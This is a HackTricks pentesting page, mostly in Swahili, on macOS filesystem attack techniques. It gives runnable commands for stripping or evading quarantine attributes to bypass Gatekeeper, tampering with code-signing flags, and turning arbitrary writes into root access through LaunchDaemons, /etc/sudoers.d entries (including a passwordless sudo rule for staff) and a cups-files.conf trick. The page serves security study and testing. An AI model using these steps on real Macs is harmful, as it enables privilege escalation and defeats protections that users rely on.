# macOS FS Tricks

{{#include ../../../../banners/hacktricks-training.md}}

## Mchanganyiko wa ruhusa za POSIX

Ruhusa katika **directory**:

- **read** - unaweza **enumerate** entries za directory
- **write** - unaweza **delete/write** **files** katika directory na unaweza **delete empty folders**.
- Lakini **huwezi delete/modify non-empty folders** isipokuwa uwe na write permissions juu yake.
- **Huwezi modify jina la folder** isipokuwa uwe mmiliki wake.
- **execute** - **unaruhusiwa ku-traverse** directory - ikiwa huna ruhusa hii, huwezi kufikia files zozote zilizo ndani yake, au katika subdirectories zozote.

### Mchanganyiko Hatari

**Jinsi ya overwrite file/folder inayomilikiwa na root**, lakini:

- **directory owner** mmoja wa parent katika path ni user
- **directory owner** mmoja wa parent katika path ni **users group** yenye **write access**
- **users group** ina **write** access kwa **file**

Kwa mchanganyiko wowote uliotajwa hapo awali, attacker anaweza **inject** **sym/hard link** kwenye path inayotarajiwa ili kupata privileged arbitrary write.

### Folder root R+X Special case

Ikiwa kuna files katika **directory** ambapo **root pekee ndiye mwenye R+X access**, files hizo **hazifikiki na mtu mwingine yeyote**. Kwa hiyo, vulnerability inayoruhusu **move file inayoweza kusomwa na user**, ambayo haiwezi kusomwa kwa sababu ya **restriction** hiyo, kutoka kwenye folder hii **hadi nyingine**, inaweza kutumiwa vibaya kusoma files hizi.

Mfano katika: [https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/#nix-directory-permissions)

## Symbolic Link / Hard Link

### Permissive file/folder

Ikiwa privileged process inaandika data katika **file** ambayo inaweza **controlled** na **lower privileged user**, au ambayo inaweza kuwa **previously created** na lower privileged user. User anaweza tu **point** hiyo kwenye file nyingine kupitia Symbolic au Hard link, na privileged process itaandika kwenye file hiyo.

Angalia sections nyingine ambako attacker anaweza **abuse an arbitrary write to escalate privileges**.

### Open `O_NOFOLLOW`

Kulingana na [`open(2)`](https://keith.github.io/xcode-man-pages/open.2.html): *"If `O_NOFOLLOW` is used in the mask and the target file passed to `open()` is a symbolic link then the `open()` will fail."* Ni **final** component pekee inayokaguliwa — kila **intermediate** component bado inatatuliwa na kufuatwa. Kwa hiyo, developer ambaye "amelinda" write kwa `O_NOFOLLOW` bado anaweza kushambuliwa kwa kuweka symlink kwenye **parent directory** yoyote ya target path.

Man page hiyo hiyo inaandika flags ambazo hufunga pengo hilo:

- **`O_NOFOLLOW_ANY`** — *"if ... any component of the path passed to `open()` is a symbolic link then the `open()` will fail."*
- **`O_RESOLVE_BENEATH`** — *"if ... the specified path resolution escapes the directory associated with the fd then the `openat()` will fail."*

Vinginevyo, `openat()` iliyo relative kwa directory FD ambayo tayari ume-validate, au `realpath()` + re-validation, ndizo njia zilizosalia za kuzuia mid-path symlink swaps.

## .fileloc

Files zenye extension ya **`.fileloc`** zinaweza kuelekeza kwenye applications au binaries nyingine, kwa hiyo zinapofunguliwa, application/binary hiyo ndiyo itakayo-execute.\
Mfano:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## File Descriptors

### Leak FD (no `O_CLOEXEC`)

Ikiwa call ya `open` haina flag ya `O_CLOEXEC`, file descriptor itarithiwa na child process. Kwa hivyo, ikiwa privileged process itafungua privileged file na kutekeleza process inayodhibitiwa na attacker, attacker **atarithi FD ya privileged file**.

Mfano maarufu ni **`DYLD_PRINT_TO_FILE` LPE katika OS X 10.10** ([SektionEins](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html)):

- `dyld` iliheshimu `DYLD_PRINT_TO_FILE=/path` hata katika **restricted (suid root) binaries**, kwa sababu variable hiyo maalum iliparsiwa nje ya `processDyldEnvironmentVariable()`.
- Ilifanya `open(loggingPath, O_WRONLY | O_CREAT | O_APPEND, 0644)`, hivyo **iliunda file inayomilikiwa na root katika path yoyote**.
- FD **haikuwahi kufungwa na haikuwa na close-on-exec flag**, kwa hivyo kila child wa suid binary alirithi **writable FD ya file inayomilikiwa na root**.
- Kuendesha, kwa mfano, `DYLD_PRINT_TO_FILE=/etc/target suid_binary` na kisha kusoma namba ya FD iliyorithiwa katika child kulitoa uwezo wa kufanya writes zozote kwenye files zinazomilikiwa na root; `fcntl(fd, F_SETFL, 0)` hata iliondoa `O_APPEND` ili kuruhusu overwriting badala ya appending.

Muundo kama huo hujitokeza kila privileged process inapofungua file **kabla** ya kufanya `exec` ya kitu unachodhibiti (helper tools, editors za mtindo wa `crontab` zinazoitwa kupitia `$EDITOR`, log/debug files zinazofunguliwa kutoka kwenye env-var path...). Enumerate FDs ulizorithi kwa kutumia:
```bash
# From inside the child process
ls -l /dev/fd/
# or
lsof -p $$
```
Kitu chochote kilicho juu ya `2` kinachoelekeza kwenye faili ambalo huwezi kulifungua mwenyewe ni primitive ya arbitrary-write (au arbitrary-read).

## Epuka tricks za quarantine xattrs

### Iondoe
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### uchg / uchange / uimmutable flag

Ikiwa file/folder ina attribute hii ya immutable, haitawezekana kuweka xattr juu yake
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### File systems zisizo na usaidizi wa xattr

Si kila file system ambayo macOS inaweza ku-mount huhifadhi **extended attributes** natively. HFS+ na APFS zinaweza; **FAT32, exFAT na mounts nyingi za NFS hazina** — macOS huzi-emulate kwa kuandika side file ya **AppleDouble** yenye jina `._<filename>` ([The Eclectic Light Company](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)).

Hilo ni muhimu kwa quarantine, kwa sababu xattr hudumu tu ikiwa inaweza kuandikwa **na kusomwa tena** kutoka kwenye volume hiyo hiyo:
```bash
# Check whether a mount point round-trips xattrs at all
xattr -w com.apple.quarantine "0081;00000000;test;" /Volumes/SOMEUSB/file
xattr -p com.apple.quarantine /Volumes/SOMEUSB/file
ls -a /Volumes/SOMEUSB/          # look for the ._file AppleDouble companion
```
Ikiwa volume itasomwa baadaye kupitia path inayopuuza companion ya `._` (au companion itaondolewa/kufutwa), file itafika **bila quarantine flag** — na `.app` isiyo na quarantine inatosha kuhepa App Sandbox, kama ilivyoelezwa katika [macOS Sandbox Debug & Bypass](../macos-sandbox/macos-sandbox-debug-and-bypass/README.md#bypassing-quarantine-attribute).

### writeextattr ACL

ACL hii huzuia kuongeza `xattrs` kwenye file
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

**AppleDouble** file format hunakili faili pamoja na ACE zake.

Katika [**source code**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html), inawezekana kuona kwamba uwakilishi wa maandishi wa ACL uliohifadhiwa ndani ya xattr inayoitwa **`com.apple.acl.text`** utawekwa kama ACL kwenye faili iliyodecompressed. Kwa hiyo, ukicompress application kuwa zip file kwa kutumia **AppleDouble** file format yenye ACL inayozuia xattrs nyingine kuandikwa ndani yake... quarantine xattr haikuwekwa kwenye application:

Angalia [**original report**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) kwa maelezo zaidi.

Ili kurudia hili, kwanza tunahitaji kupata acl string sahihi:
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(Kumbuka kwamba hata kama hii itafanya kazi, sandbox huandika xattr ya quarantine kabla)

Si muhimu sana, lakini nimeiacha hapo kwa tahadhari tu:


{{#ref}}
macos-xattr-acls-extra-stuff.md
{{#endref}}

## Bypass signature checks

### Bypass platform binaries checks

Baadhi ya ukaguzi wa usalama huangalia kama binary ni **platform binary**, kwa mfano ili kuruhusu kuunganisha kwenye huduma ya XPC. Hata hivyo, kama ilivyoonyeshwa katika bypass moja kwenye https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/ inawezekana kufanya bypass ya ukaguzi huu kwa kupata platform binary (kama /bin/ls) na kuingiza exploit kupitia dyld kwa kutumia environment variable `DYLD_INSERT_LIBRARIES`.

### Bypass flags `CS_REQUIRE_LV` and `CS_FORCED_LV`

Inawezekana kwa binary inayotekelezwa kurekebisha flags zake yenyewe ili kupita ukaguzi kwa kutumia code kama hii:
```c
// Code from https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/
int pid = getpid();
NSString *exePath = NSProcessInfo.processInfo.arguments[0];

uint32_t status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
status |= 0x2000; // CS_REQUIRE_LV
csops(pid, 9, &status, 4); // CS_OPS_SET_STATUS

status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
NSLog(@"=====Inject successfully into %d(%@), csflags=0x%x", pid, exePath, status);
```
## Bypass Code Signatures

Bundles zina faili **`_CodeSignature/CodeResources`** ambayo ina **hash** ya kila **faili** ndani ya **bundle**. Kumbuka kwamba hash ya CodeResources pia **imewekwa ndani ya executable**, kwa hivyo hatuwezi kuibadilisha hiyo pia.

Hata hivyo, kuna baadhi ya faili ambazo signature yake haitakaguliwa; hizi zina key `omit` kwenye plist, kama vile:
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/index.html)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
Inawezekana kukokotoa signature ya resource kutoka kwa cli kwa kutumia:
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
## Ku-mount dmgs

Mtumiaji anaweza ku-mount dmg maalum iliyoundwa hata juu ya baadhi ya folders zilizopo. Hivi ndivyo unavyoweza kuunda package ya dmg maalum yenye content maalum:
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
Kwa kawaida macOS hu-mount diski huku ikiwasiliana na Mach service `com.apple.DiskArbitrarion.diskarbitrariond` (inayotolewa na `/usr/libexec/diskarbitrationd`). Ukiongeza param `-d` kwenye faili ya LaunchDaemons plist na kui-restart, itaandika logs kwenye `/var/log/diskarbitrationd.log`.\
Hata hivyo, inawezekana kutumia tools kama `hdik` na `hdiutil` kuwasiliana moja kwa moja na kext ya `com.apple.driver.DiskImages`.

## Arbitrary Writes

### Periodic sh scripts

Ikiwa script yako inaweza kutafsiriwa kama **shell script**, unaweza ku-overwrite **`/etc/periodic/daily/999.local`** shell script ambayo ita-triggeriwa kila siku.

Unaweza kuiga execution ya script hii kwa: **`sudo periodic daily`**

### Daemons

Andika **LaunchDaemon** ya kiholela kama **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** yenye plist inayotekeleza script ya kiholela kama:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
Tengeneza tu script `/Applications/Scripts/privesc.sh` yenye **commands** ambazo ungependa kuendesha kama root.

### Sudoers File

Ikiwa una **arbitrary write**, unaweza kutengeneza faili ndani ya folda **`/etc/sudoers.d/`** ili kujipa ruhusa za **sudo**.

### PATH files

Faili **`/etc/paths`** ni mojawapo ya sehemu kuu zinazojaza variable ya mazingira ya PATH. Lazima uwe root ili kuibadilisha, lakini ikiwa script kutoka kwenye **privileged process** inaendesha **command bila full path**, unaweza kuweza kuifanya **hijack** kwa kurekebisha faili hii.

Unaweza pia kuandika faili ndani ya **`/etc/paths.d`** ili kupakia folda mpya kwenye variable ya mazingira ya `PATH`.

### cups-files.conf

Technique hii ilitumika katika [writeup hii](https://www.kandji.io/blog/macos-audit-story-part1).

Tengeneza faili `/etc/cups/cups-files.conf` yenye content ifuatayo:
```
ErrorLog /etc/sudoers.d/lpe
LogFilePerm 777
<some junk>
```
Hii itaunda faili `/etc/sudoers.d/lpe` lenye permissions 777. Junk ya ziada mwishoni inalenga kusababisha uundwaji wa error log.

Kisha, andika kwenye `/etc/sudoers.d/lpe` config inayohitajika ili kufanya privilege escalation kama `%staff ALL=(ALL) NOPASSWD:ALL`.

Halafu, rekebisha faili `/etc/cups/cups-files.conf` tena kwa kuweka `LogFilePerm 700`, ili faili mpya ya sudoers iwe valid wakati wa kuendesha `cupsctl`.

### Sandbox Escape

Inawezekana kutoroka kutoka kwenye macOS sandbox kwa kutumia FS arbitrary write. Kwa mifano kadhaa, angalia ukurasa wa [macOS Auto Start](../../../../macos-auto-start-locations.md), lakini njia ya kawaida ni kuandika preferences file ya Terminal kwenye `~/Library/Preferences/com.apple.Terminal.plist` ambayo huendesha command wakati wa startup, kisha kuiita kwa kutumia `open`.

## Generate writable files as other users

Privesc primitive ya kawaida sana ni kufanya **privileged process iunde faili kwa niaba yako** kwenye directory unayodhibiti, kisha kubaki na **write access** kwenye faili hilo. Vipengele viwili vinahitajika:

1. Directory unayomiliki (au ambayo unaweza kuweka **inheritable ACL**), ili kila kitu kinachoundwa ndani yake kirithi permissions zako.
2. Process yenye privileges/`suid` ambayo inaweza kuambiwa **wapi** iunde faili — kwa kawaida kupitia environment variable ya debug/logging, config file, au XPC API ya helper.

Sehemu ya **inheritable ACL** ndiyo inayofanya faili lililoundwa liwe writable kwako ingawa linamilikiwa na user mwingine. Flags za inheritance za `file_inherit` / `directory_inherit` zimeelezewa kwenye [`chmod(1)`](https://keith.github.io/xcode-man-pages/chmod.1.html):
```bash
DIRNAME=/tmp/inherit_test
mkdir -p "$DIRNAME"

# file_inherit + directory_inherit => everything created inside is writable by me
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit" "$DIRNAME"

ls -lde "$DIRNAME"   # confirm the ACE is present
```
Sasa faili yoyote ambayo mchakato wenye privileged unatengeneza ndani ya `$DIRNAME` **inaweza kuandikwa na wewe**. Ikiwa directory hiyo pia ni eneo ambalo baadaye **hutekelezwa kama root** (`/etc/periodic/*`, `/etc/cron.d`, `/etc/sudoers.d`, directory ya LaunchDaemon...), hii ni root escalation ya moja kwa moja. Tazama sehemu za [Sudoers File](#sudoers-file) na [cups-files.conf](#cups-filesconf) hapo juu ili kuona cha kuandika mara tu unapokuwa na faili hiyo.

Kwa mfano kamili wa mnyororo wa `"env variable makes a root process create a file, and the FD leaks to you"`, tazama [Leak FD (no `O_CLOEXEC`)](#leak-fd-no-o_cloexec) hapo juu.

## POSIX Shared Memory

**POSIX shared memory** huruhusu processes katika operating systems zinazotii POSIX kufikia eneo la memory la pamoja, hivyo kuwezesha mawasiliano ya haraka zaidi ikilinganishwa na mbinu nyingine za inter-process communication. Hii inahusisha kuunda au kufungua shared memory object kwa kutumia `shm_open()`, kuweka ukubwa wake kwa `ftruncate()`, na kuimap katika address space ya process kwa kutumia `mmap()`. Processes zinaweza kisha kusoma moja kwa moja kutoka na kuandika kwenye eneo hili la memory. Ili kudhibiti access ya wakati mmoja na kuzuia data corruption, synchronization mechanisms kama mutexes au semaphores hutumiwa mara nyingi. Mwishowe, processes hu-unmap na kufunga shared memory kwa `munmap()` na `close()`, na kwa hiari huondoa memory object kwa `shm_unlink()`. Mfumo huu ni mzuri hasa kwa IPC yenye ufanisi na kasi katika mazingira ambayo processes nyingi zinahitaji kufikia shared data kwa haraka.

<details>

<summary>Mfano wa Code ya Producer</summary>
```c
// gcc producer.c -o producer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Create the shared memory object
int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Configure the size of the shared memory object
if (ftruncate(shm_fd, SIZE) == -1) {
perror("ftruncate");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Write to the shared memory
sprintf(ptr, "Hello from Producer!");

// Unmap and close, but do not unlink
munmap(ptr, SIZE);
close(shm_fd);

return 0;
}
```
</details>

<details>

<summary>Mfano wa Consumer Code</summary>
```c
// gcc consumer.c -o consumer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Open the shared memory object
int shm_fd = shm_open(name, O_RDONLY, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Read from the shared memory
printf("Consumer received: %s\n", (char *)ptr);

// Cleanup
munmap(ptr, SIZE);
close(shm_fd);
shm_unlink(name); // Optionally unlink

return 0;
}

```
</details>

## macOS Guarded Descriptors

**macOS Guarded Descriptors** ni kipengele cha usalama kilichoanzishwa katika macOS ili kuimarisha usalama na utegemezi wa **file descriptor operations** katika applications za watumiaji. Guarded descriptors hizi hutoa njia ya kuhusisha vizuizi maalum au "guards" na file descriptors, ambavyo hutekelezwa na kernel.

Kipengele hiki ni muhimu hasa katika kuzuia aina fulani za vulnerabilities za usalama kama vile **ufikiaji usioidhinishwa wa files** au **race conditions**. Vulnerabilities hizi hutokea, kwa mfano, thread inapofikia file description na kumpa **thread nyingine iliyo katika hatari ufikiaji wa file hiyo**, au file descriptor **inaporithiwa** na child process iliyo katika hatari. Baadhi ya functions zinazohusiana na utendaji huu ni:

- `guarded_open_np`: Fungua FD yenye guard
- `guarded_close_np`: Ifunge
- `change_fdguard_np`: Badilisha flags za guard kwenye descriptor (hata kuondoa ulinzi wa guard)

## References

- [https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/](https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/)
- [SektionEins - OS X 10.10 DYLD_PRINT_TO_FILE Local Privilege Escalation](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html) (FD iliyovuja bila close-on-exec)
- [The Eclectic Light Company - Ni file systems na cloud services zipi huhifadhi extended attributes?](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)
- [`open(2)` man page](https://keith.github.io/xcode-man-pages/open.2.html) (`O_NOFOLLOW`, `O_NOFOLLOW_ANY`, `O_RESOLVE_BENEATH`)
- [`chmod(1)` man page](https://keith.github.io/xcode-man-pages/chmod.1.html) (flags za ACL inheritance)
- [Microsoft - Gatekeeper's Achilles heel: kugundua vulnerability ya macOS](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)

{{#include ../../../../banners/hacktricks-training.md}}
